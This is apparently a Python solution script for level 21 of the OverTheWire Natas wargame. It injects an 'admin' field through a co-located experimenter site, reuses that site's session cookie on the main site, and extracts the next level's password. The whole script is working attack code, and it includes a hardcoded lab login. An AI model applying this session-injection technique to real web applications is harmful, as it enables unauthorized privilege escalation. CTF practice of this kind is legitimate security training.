import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    css_site_header = {
            "Host":"natas21-experimenter.natas.labs.overthewire.org"
            }
    post_data = {
            "align":"center",
            "fontsize":"100%",
            "bgcolor":"yellow",
            "submit":"Update",
            "admin":"1"
            }
    post_site = requests.post(url + "index.php",auth=(username,password),data=post_data,headers=css_site_header)
    sess_id = post_site.headers.get('Set-Cookie').replace("; path=/; HttpOnly","")
    cookie = {
            "Cookie":sess_id.strip()
            }
    site = requests.get(url,auth=(username,password),headers=cookie)
    flag = re.findall("Password:(.*)</pre>",site.text)
    print("The flag for natas21 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas21.natas.labs.overthewire.org/"
    username = "natas21"
    password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
    flag(url,username,password)